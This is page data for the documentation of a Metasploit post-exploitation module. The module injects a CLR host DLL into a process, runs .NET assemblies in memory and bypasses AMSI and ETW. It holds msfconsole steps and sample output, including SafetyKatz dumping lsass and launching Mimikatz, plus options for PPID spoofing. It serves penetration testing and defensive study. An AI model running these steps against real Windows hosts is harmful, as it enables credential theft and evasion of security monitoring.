{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/post/windows/manage/execute_dotnet_assembly","result":{"data":{"moduleMetadataJson":{"id":"bedca12b-ce23-5015-a16b-a293bc6d5880","name":"Execute .net Assembly (x64 only)","fullname":"post/windows/manage/execute_dotnet_assembly","description":"This module executes a .net assembly in memory. It\n          reflectively loads a dll that will host CLR, then it copies\n          the assembly to be executed into memory. Credits for Amsi\n          bypass to Rastamouse (@_RastaMouse)","rank":300,"fields":{"detailsSlug":"/modules/details/post/windows/manage/execute_dotnet_assembly","documentationSlug":"/modules/documentation/post/windows/manage/execute_dotnet_assembly","referencesSlug":"/modules/references/post/windows/manage/execute_dotnet_assembly"},"documentation":{"html":"<h1 id=\"execute-net-assembly-via-meterpreter-session\" style=\"position:relative;\"><a href=\"#execute-net-assembly-via-meterpreter-session\" aria-label=\"execute net assembly via meterpreter session permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Execute .Net assembly via Meterpreter session</h1>\n<p>This module to executing a .NET Assembly from Meterpreter session</p>\n<p>It spawn a process (or use an existing process providing pid) and use Reflective dll injection to load HostingCLRx64.dll needed to run .Net assembly\nThe unmanaged injected dll takes care of verifying if the process has already loaded the clr, and loads it if necessary. The version of the CLR to be loaded is determined by executing the parsing of the assembly provided searching for a known signature. Then run the assembly from memory.\nBefore loading the assembly in the context of the clr, Amsi is bypassed using the AmsiScanBuffer patching technique (<a href=\"https://rastamouse.me/2018/10/amsiscanbuffer-bypass-part-1/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://rastamouse.me/2018/10/amsiscanbuffer-bypass-part-1/</a>)</p>\n<p>You'll find details at <a href=\"https://b4rtik.blogspot.com/2018/12/execute-assembly-via-meterpreter-session.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Execute assembly via Meterpreter session</a></p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>  Example 1 no PID specified:</p>\n<ol>\n<li>Start Clone from github SeatBelt or other .Net progect</li>\n<li>Buid project with target framework 4.x or 3.5</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use post/windows/manage/execute_dotnet_assembly</code></li>\n<li>Do: <code class=\"language-text\">set SESSION sessionid</code></li>\n<li>Do: <code class=\"language-text\">set DOTNET_EXE /your/output/folder/file.exe</code></li>\n<li>Do: <code class=\"language-text\">set ARGUMENTS user</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get something like that follow</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 post(windows/manage/execute_dotnet_assembly) &gt; run\n\n[*] Launching notepad.exe to host CLR...\n[+] Process 10628 launched.\n[*] Reflectively injecting the Host DLL into 10628..\n[*] Injecting Host into 10628...\n[*] Host injected. Copy assembly into 10628...\n[*] Assembly copied.\n[*] Executing...\n[*] Start reading output\n[+] \n[+] \n[+]                         %&amp;&amp;@@@&amp;&amp;                                                                                  \n[+]                         &amp;&amp;&amp;&amp;&amp;&amp;&amp;%%%,                       #&amp;&amp;@@@@@@%%%%%%###############%                         \n[+]                         &amp;%&amp;   %&amp;%%                        &amp;////(((&amp;%%%%%#%################//((((###%%%%%%%%%%%%%%%\n[+] %%%%%%%%%%%######%%%#%%####%  &amp;%%**#                      @////(((&amp;%%%%%%######################(((((((((((((((((((\n[+] #%#%%%%%%%#######%#%%#######  %&amp;%,,,,,,,,,,,,,,,,         @////(((&amp;%%%%%#%#####################(((((((((((((((((((\n[+] #%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&amp;%%%%%%%######################(#(((#(#((((((((((\n[+] #####%%%####################  &amp;%%......  ...   ..         @////(((&amp;%%%%%%%###############%######((#(#(####((((((((\n[+] #######%##########%#########  %%%......  ...   ..         @////(((&amp;%%%%%#########################(#(#######((#####\n[+] ###%##%%####################  &amp;%%...............          @////(((&amp;%%%%%%%%##############%#######(#########((#####\n[+] #####%######################  %%%..                       @////(((&amp;%%%%%%%################                        \n[+]                         &amp;%&amp;   %%%%%      Seatbelt         %////(((&amp;%%%%%%%%#############*                         \n[+]                         &amp;%%&amp;&amp;&amp;%%%%%        v0.2.0         ,(((&amp;%%%%%%%%%%%%%%%%%,                                 \n[+]                          #%%%%##,                                                                                 \n.........\n.........\n.........\n[+]   [*] Use the Mimikatz &quot;dpapi::cred&quot; module with appropriate /masterkey to decrypt\n[+] \n[+] \n[+] === Checking for RDCMan Settings Files (Current User) ===\n[+] \n[+] \n[+] \n[+] [*] Completed Safety Checks in 11 seconds\n[+] \n[*] End output.\n[+] Killing process 10628\n[+] Execution finished.\n[*] Post module execution completed\nmsf5 post(windows/manage/execute_dotnet_assembly) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>  Example 2 PID specified:</p>\n<ol>\n<li>Start Clone from github SeatBelt or other .Net progect</li>\n<li>Buid project with target framework 4.x or 3.5</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use post/windows/manage/execute_dotnet_assembly</code></li>\n<li>Do: <code class=\"language-text\">set SESSION sessionid</code></li>\n<li>Do: <code class=\"language-text\">set PID 8648</code></li>\n<li>Do: <code class=\"language-text\">set ASSEMBLYPATH /your/output/folder/SeatBelt.exe</code></li>\n<li>Do: <code class=\"language-text\">set ARGUMENTS user</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get something like that follow</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 post(windows/manage/execute_dotnet_assembly) &gt; run\n\n[*] Warning: output unavailable\n[*] Hooking 8648 to host CLR...\n[+] Process 8648 hooked.\n[*] Reflectively injecting the Host DLL into 8648..\n[*] Injecting Host into 8648...\n[*] Host injected. Copy assembly into 8648...\n[*] Assembly copied.\n[*] Executing...\n[+] Execution finished.\n[*] Post module execution completed\nmsf5 post(windows/manage/execute_dotnet_assembly) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>  Example 3 perform the functionality test of the Amsi bypass.\nTo perform the test it is necessary to use an assembly that runs\nAssembly.Load to load an assembly that we know to be detected.\nIn the following example we use SafetyKatz which dynamically\nloads Mimikatz via Assmbly.Load</p>\n<ol>\n<li>Start Clone from github SafetyKatz or other .Net progect</li>\n<li>Buid project with target framework 4.x</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use post/windows/manage/execute_dotnet_assembly</code></li>\n<li>Do: <code class=\"language-text\">set SESSION sessionid</code></li>\n<li>Do: <code class=\"language-text\">set PID 8648</code></li>\n<li>Do: <code class=\"language-text\">set DOTNET_EXE /your/output/folder/SafetyKatz.exe</code></li>\n<li>Do: <code class=\"language-text\">set ARGUMENTS user</code></li>\n<li>Do: <code class=\"language-text\">set PROCESS nslookup.exe</code></li>\n<li>Do: <code class=\"language-text\">set AMSIBYPASS false</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get something like that follow</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 post(windows/manage/execute_dotnet_assembly) &gt; run\n\n[*] Launching nslookup.exe to host CLR...\n[+] Process 19904 launched.\n[*] Reflectively injecting the Host DLL into 19904..\n[*] Injecting Host into 19904...\n[*] Host injected. Copy assembly into 19904...\n[*] Assembly copied.\n[*] Executing...\n[*] Start reading output\n[+] Server predefinito:  \n[+] Address:  192.168.1.1\n[+] \n[+] &gt; \n[*] End output.\n[+] Killing process 19904\n[+] Execution finished.\n[*] Post module execution completed\nmsf5 post(windows/manage/execute_dotnet_assembly) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Than</p>\n<ol>\n<li>Do: <code class=\"language-text\">set AMSIBYPASS true</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 post(windows/manage/execute_dotnet_assembly) &gt; set amsibypass true\namsibypass =&gt; true\nmsf5 post(windows/manage/execute_dotnet_assembly) &gt; run\n\n[*] Launching nslookup.exe to host CLR...\n[+] Process 19568 launched.\n[*] Reflectively injecting the Host DLL into 19568..\n[*] Injecting Host into 19568...\n[*] Host injected. Copy assembly into 19568...\n[*] Assembly copied.\n[*] Executing...\n[*] Start reading output\n[+] Server predefinito:  \n[+] Address:  192.168.1.1\n[+] \n[+] &gt; \n[+] [*] Dumping lsass (744) to C:\\WINDOWS\\Temp\\debug.bin\n[+] [+] Dump successful!\n[+] \n[+] [*] Executing loaded Mimikatz PE\n[+] \n[+]   .#####.   mimikatz 2.1.1 (x64) built on Jul  7 2018 03:36:26 - lil!\n[+]  .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)\n[+]  ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n[+]  ## \\ / ##       &gt; http://blog.gentilkiwi.com/mimikatz\n[+]  &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n[+]   &#39;#####&#39;        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/\n[+] \n[+] mimikatz # Opening : &#39;C:\\Windows\\Temp\\debug.bin&#39; file for minidump...\n[+] ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list\n[+] Opening : &#39;C:\\Windows\\Temp\\debug.bin&#39; file for minidump...\n[+] ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)\n[+] \n[+] mimikatz # deleting C:\\Windows\\Temp\\debug.bin\n[+] Execution started\n[+] ICorRuntimeHost-&gt;GetDefaultDomain(...) succeeded\n[*] End output.\n[+] Killing process 19568\n[+] Execution finished.\n[*] Post module execution completed\nmsf5 post(windows/manage/execute_dotnet_assembly) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">Module options (post/windows/manage/execute_dotnet_assembly):\n\n   Name            Current Setting  Required  Description\n   ----            ---------------  --------  -----------\n   AMSIBYPASS      true             yes       Enable Amsi bypass\n   ARGUMENTS                        no        Command line arguments\n   DOTNET_EXE                       yes       Assembly file name\n   ETWBYPASS       true             yes       Enable Etw bypass\n   PID             0                no        Pid  to inject\n   PPID            0                no        Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing)\n   PROCESS         notepad.exe      no        Process to spawn\n   SESSION                          yes       The session to run this module on.\n   USETHREADTOKEN  true             no        Spawn process with thread impersonation\n   WAIT            10               no        Time in seconds to wait</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>AMSIBYPASS</p>\n<p>Enable or Disable Amsi bypass. This parameter is necessary due to the technique used. It is possible that subsequent updates will make the bypass unstable which could result in a crash. By setting the parameter to false the module continues to work.</p>\n<p>ARGUMENTS</p>\n<p>Command line arguments. The signature of the Main method must match with the parameters that have been set in the module, for example:</p>\n<p>If the property ARGUMENTS is set to \"antani sblinda destra\" the main method should be \"static void main (string [] args)\"<br />\nIf the property ARGUMENTS is set to \"\" the main method should be \"static void main ()\"</p>\n<p>DOTNET_EXE </p>\n<p>Dotnet Executable to execute</p>\n<p>PID</p>\n<p>Pid to inject. If different from 0 the module does not create a new process but uses the existing process identified by the PID parameter.</p>\n<p>PROCESS</p>\n<p>Process to spawn when PID is equal to 0.</p>\n<p>SESSION</p>\n<p>The session to run this module on. Must be meterpreter session</p>\n<p>WAIT</p>\n<p>Time in seconds to wait before starting to read the output.</p>"}}},"pageContext":{"id":"bedca12b-ce23-5015-a16b-a293bc6d5880"}}}